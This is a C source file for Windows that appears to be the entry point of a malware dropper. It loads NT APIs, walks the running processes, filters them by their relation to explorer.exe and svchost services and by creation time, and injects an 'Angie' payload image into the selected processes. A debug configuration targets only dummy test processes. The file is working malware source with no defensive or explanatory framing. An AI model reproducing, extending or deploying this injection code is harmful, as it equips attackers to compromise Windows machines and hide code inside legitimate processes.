#include <ldr.h>
#include <ntapi.h>
#include <fnv1a.h>
#include <random.h>
#include <angie.h>

VOID
DECLSPEC_DLLEXPORT
DropperEntry(VOID)
{
    #ifdef DEBUG
        #ifdef _AMD64_
            UNICODE_STRING DebugName = CONST_UNICODE_STRING(SCFG_DLOG_DROPPER_X64_THREAD0);

            $DLogInitialize(&DebugName, TRUE);
        #else
            $DLogInitialize(NULL, TRUE);
        #endif
    #endif

    InitRandom();
    InitAngieImage();

    if (!LdrLoadNtapi()) {
        return;
    }

    #if 0
        DWORD dwLogicalDrives;

        if (LdrQueryAllFixedVolumesBitmask(&dwLogicalDrives)) {
            for (ULONG_PTR i = 0; i != 26; i++) {
                if ((dwLogicalDrives >> i) & 0x1) {
                    $DLOG1(DLG_FLT_HIGHLIGHT, "%c", 'A' + i);
                }
            }
        }
    #endif

    PSYSTEM_PROCESS_INFORMATION ProcessesList;

    if (LdrQueryAllProcesses(&ProcessesList)) {
        #if SCFG_DROPPER_PROCESSQUERY_INJECT_TO_PHONY == ON
            for (PSYSTEM_PROCESS_INFORMATION ProcessIndex = ProcessesList; ProcessIndex->NextEntryOffset; ProcessIndex = (PVOID)((ULONG_PTR)ProcessIndex + ProcessIndex->NextEntryOffset)) {
                WCHAR szDummyName64[] = L"DummyProcessx64.exe";
                WCHAR szDummyName32[] = L"DummyProcessx86.exe";
                
                if (ProcessIndex->ImageName.MaximumLength == sizeof(szDummyName64) || ProcessIndex->ImageName.MaximumLength == sizeof(szDummyName32)) {
                    if (RtlpCompareUnicodeNZ(ProcessIndex->ImageName.Buffer, szDummyName64, sizeof(szDummyName64)) || RtlpCompareUnicodeNZ(ProcessIndex->ImageName.Buffer, szDummyName32, sizeof(szDummyName32))) {
                        #ifdef DEBUG
                            InjectAngieToProcess((ULONG)ProcessIndex->UniqueProcessId, ProcessIndex->ImageName.Buffer);
                        #else
                            InjectAngieToProcess((ULONG)ProcessIndex->UniqueProcessId, ProcessIndex->ImageName.Buffer);
                        #endif
                    }
                }
            }
        #else
            PROCESSESFILTER Filter;
            QWORD qwTimeDenominator = SCFG_DROPPER_PROCESSQUERY_TIME_DENOMINATOR;

            if (LdrCreateOptimalProcessFilter(ProcessesList, &Filter)) {
                for (ULONG_PTR i = 0; i != SCFG_DROPPER_PROCESSQUERY_TRIES; i++) {
                    $DLOG2(DLG_FLT_DEFAULT, "qwTimeDenominator = %I64lu", qwTimeDenominator);

                    for (PSYSTEM_PROCESS_INFORMATION ProcessIndex = ProcessesList; ProcessIndex->NextEntryOffset; ProcessIndex = (PVOID)((ULONG_PTR)ProcessIndex + ProcessIndex->NextEntryOffset)) {
                        if (!ProcessIndex->UniqueProcessId || (QWORD)ProcessIndex->CreateTime.QuadPart / qwTimeDenominator > Filter.qwExplorerStartTime / qwTimeDenominator) {
                            continue;
                        }

                        if (ProcessIndex->UniqueProcessId == Filter.ExplorerPid || ProcessIndex->InheritedFromUniqueProcessId == Filter.ExplorerPid) {
                            #if SCFG_DROPPER_PROCESSQUERY_PRINT_QUERY == ON
                                $DLOG1(DLG_FLT_DEFAULT, "    %p -> %p %ls", ProcessIndex->InheritedFromUniqueProcessId, ProcessIndex->UniqueProcessId, ProcessIndex->ImageName.Buffer);
                            #endif

                            ProcessIndex->UniqueProcessId = 0;
                        } else if (ProcessIndex->InheritedFromUniqueProcessId != Filter.ServicePid) {
                            for (PSYSTEM_PROCESS_INFORMATION ServicesIndex = ProcessesList; ServicesIndex->NextEntryOffset; ServicesIndex = (PVOID)((ULONG_PTR)ServicesIndex + ServicesIndex->NextEntryOffset)) {
                                if (ServicesIndex->InheritedFromUniqueProcessId == Filter.ServicePid) { // svchost.exe
                                    if (ProcessIndex->InheritedFromUniqueProcessId == ServicesIndex->UniqueProcessId) {
                                        #if SCFG_DROPPER_PROCESSQUERY_PRINT_QUERY == ON
                                            $DLOG1(DLG_FLT_DEFAULT, "    %p -> %p %ls", ProcessIndex->InheritedFromUniqueProcessId, ProcessIndex->UniqueProcessId, ProcessIndex->ImageName.Buffer);
                                        #endif

                                        ProcessIndex->UniqueProcessId = 0;
                                    }
                                }
                            }
                        }
                    }

                    qwTimeDenominator <<= SCFG_DROPPER_PROCESSQUERY_TIME_SHIFT_ON_FAIL;

                    if (i == SCFG_DROPPER_PROCESSQUERY_TRIES - 1) {
                        $DLOG1(DLG_FLT_CRITICAL, "Failed!");
                    } else {
                        $DLOG1(DLG_FLT_ERROR, "Increasing time denominator!");
                    }
                }
            }
        #endif

        {
            SIZE_T dwRegionSize = 0;

            if (NT_ERROR(NtFreeVirtualMemory(NtCurrentProcess(), (PVOID)&ProcessesList, &dwRegionSize, MEM_RELEASE))) {
                $DLOG3(DLG_FLT_ERROR, "Failed to free ProcessesList");
            }
        };
    }
}
